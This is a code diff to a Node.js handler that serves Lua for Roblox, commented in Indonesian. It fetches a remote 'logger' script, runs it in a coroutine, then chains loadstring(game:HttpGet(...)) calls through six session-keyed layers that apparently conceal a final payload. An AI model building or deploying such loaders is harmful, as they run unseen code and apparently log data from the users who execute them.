@@ -97,7 +97,7 @@ module.exports = async function(req, res) {
     const currentPath = urlParts[0];
     
     try {
-        // ========== STEP 0: LOGGER SCRIPT + REDIRECT KE LAYER 1 ==========
+        // ========== STEP 0: LOGGER DI COROUTINE, LOADSTRING DI DALAM ==========
         if (currentStep === 0) {
             let sequence = [];
             while (sequence.length < SETTINGS.TOTAL_LAYERS) {
@@ -108,14 +108,14 @@ module.exports = async function(req, res) {
             const { newSessionID, nextKey, waitTime } = makeSession(cleanIp, sequence, 0);
             const firstStep = sequence[0];
             const nextUrl = "https://" + host + currentPath + "?" + firstStep + "." + newSessionID + "." + nextKey;
-
-            // Logger jalan di coroutine, lalu redirect ke layer 1
             const loggerScript = await fetchRaw(SETTINGS.LOGGER_SCRIPT_URL);
+
+            // loadstring ada di DALAM coroutine setelah logger selesai
             const luaScript = "coroutine.wrap(function()\n" +
                               (loggerScript || '') + "\n" +
-                              "end)()\n" +
-                              "task.wait(" + (waitTime / 1000) + ") " +
-                              "loadstring(game:HttpGet(\"" + nextUrl + "\"))()";
+                              "task.wait(" + (waitTime / 1000) + ")\n" +
+                              "loadstring(game:HttpGet(\"" + nextUrl + "\"))()\n" +
+                              "end)()";
             return res.status(200).send(luaScript);
         }
 
@@ -158,7 +158,7 @@ module.exports = async function(req, res) {
 
         /*
          * TOTAL_LAYERS = 6, mapping idx:
-         * step 0  → logger + redirect ke layer 1
+         * step 0  → logger (coroutine) + redirect ke layer 1 (idx 0)
          * idx 0   → layer 1 → redirect biasa
          * idx 1   → layer 2 → redirect biasa
          * idx 2   → layer 3 → redirect biasa
